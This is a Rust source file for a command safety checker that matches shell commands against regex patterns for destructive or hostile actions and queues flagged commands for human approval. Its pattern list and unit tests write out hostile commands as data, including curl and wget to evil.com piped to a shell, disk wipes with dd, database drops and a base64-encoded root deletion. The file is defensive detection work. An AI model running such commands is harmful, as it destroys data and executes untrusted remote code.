use std::collections::HashMap;
use std::time::Instant;

use serde::Serialize;
use tokio::sync::oneshot;

/// A dangerous command pattern.
struct DangerousPattern {
    name: String,
    regex: regex::Regex,
    description: String,
}

/// Result of checking a command against dangerous patterns.
#[derive(Debug, Clone, Serialize)]
pub struct CommandVerdict {
    pub command: String,
    pub is_dangerous: bool,
    pub matched_patterns: Vec<PatternMatch>,
}

/// A matched dangerous pattern.
#[derive(Debug, Clone, Serialize)]
pub struct PatternMatch {
    pub name: String,
    pub description: String,
}

/// Built-in dangerous command patterns: (name, regex, description).
const DANGEROUS_PATTERNS: &[(&str, &str, &str)] = &[
    (
        "rm_rf_root",
        r"rm\s+(-[a-zA-Z]*r[a-zA-Z]*\s+.*)?-[a-zA-Z]*f[a-zA-Z]*\s+/\s*$|rm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+.*)?-[a-zA-Z]*r[a-zA-Z]*\s+/\s*$|rm\s+-rf\s+/",
        "Recursive force-delete from root filesystem",
    ),
    (
        "curl_pipe_sh",
        r"curl\s+.*\|\s*(ba)?sh|wget\s+.*\|\s*(ba)?sh",
        "Piping remote content directly to shell",
    ),
    (
        "chmod_777",
        r"chmod\s+(-R\s+)?777\s+/",
        "Setting world-writable permissions on system paths",
    ),
    (
        "dd_of_dev",
        r"dd\s+.*of=/dev/[a-z]",
        "Direct write to block device",
    ),
    (
        "mkfs_dev",
        r"mkfs\s+.*(/dev/[a-z]|--force)",
        "Formatting a block device",
    ),
    (
        "fork_bomb",
        r":\(\)\s*\{\s*:\|:\s*&\s*\}\s*;",
        "Fork bomb pattern",
    ),
    (
        "python_reverse_shell",
        r"python[23]?\s+-c\s+.*socket.*connect",
        "Python reverse shell",
    ),
    (
        "nc_reverse_shell",
        r"nc\s+(-e|--exec)\s+/(bin|usr)",
        "Netcat reverse shell",
    ),
    (
        "iptables_flush",
        r"iptables\s+-F|iptables\s+--flush",
        "Flushing all firewall rules",
    ),
    (
        "disable_firewall",
        r"(?i)(systemctl|service)\s+(stop|disable)\s+(firewalld|ufw|iptables)",
        "Disabling system firewall",
    ),
    (
        "drop_database",
        r"(?i)drop\s+(database|table)\s+",
        "SQL database/table drop",
    ),
    (
        "eval_base64",
        r"eval\s+.*base64|base64\s+-d.*\|\s*(ba)?sh",
        "Evaluating base64-encoded commands",
    ),
    (
        "sudo_chmod_suid",
        r"chmod\s+[+u]s\s+|chmod\s+4[0-7]{3}\s+",
        "Setting SUID bit",
    ),
    (
        "history_clear",
        r"history\s+-c|>\s*~/\..*history|rm\s+.*\.bash_history",
        "Clearing shell history",
    ),
];

/// Checks commands for dangerous patterns.
pub struct CommandChecker {
    patterns: Vec<DangerousPattern>,
}

impl CommandChecker {
    pub fn new() -> Self {
        let patterns = DANGEROUS_PATTERNS
            .iter()
            .filter_map(|&(name, regex_str, desc)| {
                regex::Regex::new(regex_str).ok().map(|re| DangerousPattern {
                    name: name.to_string(),
                    regex: re,
                    description: desc.to_string(),
                })
            })
            .collect();
        Self { patterns }
    }

    /// Check a command string for dangerous patterns.
    pub fn check(&self, command: &str) -> CommandVerdict {
        let mut matched = Vec::new();
        for pattern in &self.patterns {
            if pattern.regex.is_match(command) {
                matched.push(PatternMatch {
                    name: pattern.name.clone(),
                    description: pattern.description.clone(),
                });
            }
        }
        CommandVerdict {
            command: command.to_string(),
            is_dangerous: !matched.is_empty(),
            matched_patterns: matched,
        }
    }
}

impl Default for CommandChecker {
    fn default() -> Self {
        Self::new()
    }
}

// ---------------------------------------------------------------------------
// Pending command approvals
// ---------------------------------------------------------------------------

/// Internal entry for a pending command approval.
struct PendingApprovalEntry {
    id: u64,
    command: String,
    reasons: Vec<PatternMatch>,
    created_at: Instant,
    resolver: Option<oneshot::Sender<bool>>,
}

/// Serializable info about a pending approval (for the socket API).
#[derive(Debug, Clone, Serialize)]
pub struct PendingApprovalInfo {
    pub id: u64,
    pub command: String,
    pub reasons: Vec<PatternMatch>,
    pub age_secs: f64,
}

/// Manages pending command approval requests.
///
/// When a dangerous command is detected with `ask` action, an approval
/// request is created. The `command.check` handler blocks (with timeout)
/// waiting for resolution via `command.approve` or `command.deny`.
pub struct PendingApprovals {
    approvals: HashMap<u64, PendingApprovalEntry>,
    next_id: u64,
}

impl PendingApprovals {
    pub fn new() -> Self {
        Self {
            approvals: HashMap::new(),
            next_id: 0,
        }
    }

    /// Create a new pending approval. Returns the approval ID and a receiver
    /// that resolves to `true` (approved) or `false` (denied).
    pub fn create(
        &mut self,
        command: String,
        reasons: Vec<PatternMatch>,
    ) -> (u64, oneshot::Receiver<bool>) {
        let id = self.next_id;
        self.next_id += 1;

        let (tx, rx) = oneshot::channel();
        self.approvals.insert(
            id,
            PendingApprovalEntry {
                id,
                command,
                reasons,
                created_at: Instant::now(),
                resolver: Some(tx),
            },
        );

        tracing::info!(approval_id = id, "pending approval created");
        (id, rx)
    }

    /// Resolve a pending approval (approve or deny).
    pub fn resolve(&mut self, id: u64, approved: bool) -> Result<(), String> {
        let entry = self
            .approvals
            .get_mut(&id)
            .ok_or_else(|| format!("approval {id} not found"))?;
        let tx = entry
            .resolver
            .take()
            .ok_or_else(|| format!("approval {id} already resolved"))?;
        let _ = tx.send(approved);
        tracing::info!(approval_id = id, approved, "approval resolved");
        Ok(())
    }

    /// Remove a pending approval (called after resolution or timeout).
    pub fn remove(&mut self, id: u64) {
        self.approvals.remove(&id);
    }

    /// List all pending approvals.
    pub fn list(&self) -> Vec<PendingApprovalInfo> {
        self.approvals
            .values()
            .map(|a| PendingApprovalInfo {
                id: a.id,
                command: a.command.clone(),
                reasons: a.reasons.clone(),
                age_secs: a.created_at.elapsed().as_secs_f64(),
            })
            .collect()
    }
}

impl Default for PendingApprovals {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn checker() -> CommandChecker {
        CommandChecker::new()
    }

    #[test]
    fn detects_rm_rf_root() {
        let v = checker().check("rm -rf /");
        assert!(v.is_dangerous);
        assert!(v.matched_patterns.iter().any(|p| p.name == "rm_rf_root"));
    }

    #[test]
    fn detects_curl_pipe_sh() {
        let v = checker().check("curl https://evil.com/script.sh | sh");
        assert!(v.is_dangerous);
        assert!(
            v.matched_patterns
                .iter()
                .any(|p| p.name == "curl_pipe_sh")
        );
    }

    #[test]
    fn detects_wget_pipe_bash() {
        let v = checker().check("wget -qO- https://evil.com/payload | bash");
        assert!(v.is_dangerous);
        assert!(
            v.matched_patterns
                .iter()
                .any(|p| p.name == "curl_pipe_sh")
        );
    }

    #[test]
    fn detects_chmod_777() {
        let v = checker().check("chmod 777 /etc/passwd");
        assert!(v.is_dangerous);
        assert!(v.matched_patterns.iter().any(|p| p.name == "chmod_777"));
    }

    #[test]
    fn detects_dd_of_dev() {
        let v = checker().check("dd if=/dev/zero of=/dev/sda bs=1M");
        assert!(v.is_dangerous);
        assert!(v.matched_patterns.iter().any(|p| p.name == "dd_of_dev"));
    }

    #[test]
    fn detects_drop_database() {
        let v = checker().check("mysql -e 'DROP DATABASE production'");
        assert!(v.is_dangerous);
        assert!(
            v.matched_patterns
                .iter()
                .any(|p| p.name == "drop_database")
        );
    }

    #[test]
    fn detects_eval_base64() {
        let v = checker().check("echo cm0gLXJmIC8= | base64 -d | sh");
        assert!(v.is_dangerous);
        assert!(
            v.matched_patterns
                .iter()
                .any(|p| p.name == "eval_base64")
        );
    }

    #[test]
    fn detects_iptables_flush() {
        let v = checker().check("iptables -F");
        assert!(v.is_dangerous);
        assert!(
            v.matched_patterns
                .iter()
                .any(|p| p.name == "iptables_flush")
        );
    }

    #[test]
    fn allows_safe_commands() {
        let v = checker().check("ls -la /home/user");
        assert!(!v.is_dangerous);
        assert!(v.matched_patterns.is_empty());
    }

    #[test]
    fn allows_normal_rm() {
        let v = checker().check("rm -f /tmp/test.log");
        assert!(!v.is_dangerous);
    }

    #[test]
    fn allows_normal_curl() {
        let v = checker().check("curl https://api.example.com/data");
        assert!(!v.is_dangerous);
    }

    #[test]
    fn allows_normal_chmod() {
        let v = checker().check("chmod 644 /home/user/file.txt");
        assert!(!v.is_dangerous);
    }

    #[test]
    fn allows_normal_dd() {
        let v = checker().check("dd if=input.img of=output.img bs=4M");
        assert!(!v.is_dangerous);
    }

    #[tokio::test]
    async fn pending_approval_create_and_resolve() {
        let mut pa = PendingApprovals::new();
        let reasons = vec![PatternMatch {
            name: "test".into(),
            description: "test pattern".into(),
        }];
        let (id, rx) = pa.create("rm -rf /".into(), reasons);

        assert_eq!(pa.list().len(), 1);

        pa.resolve(id, true).unwrap();
        assert!(rx.await.unwrap());
    }

    #[tokio::test]
    async fn pending_approval_deny() {
        let mut pa = PendingApprovals::new();
        let (id, rx) = pa.create("bad cmd".into(), vec![]);

        pa.resolve(id, false).unwrap();
        assert!(!rx.await.unwrap());

        pa.remove(id);
        assert!(pa.list().is_empty());
    }

    #[test]
    fn pending_approval_double_resolve_fails() {
        let mut pa = PendingApprovals::new();
        let (id, _rx) = pa.create("cmd".into(), vec![]);

        pa.resolve(id, true).unwrap();
        assert!(pa.resolve(id, false).is_err());
    }
}
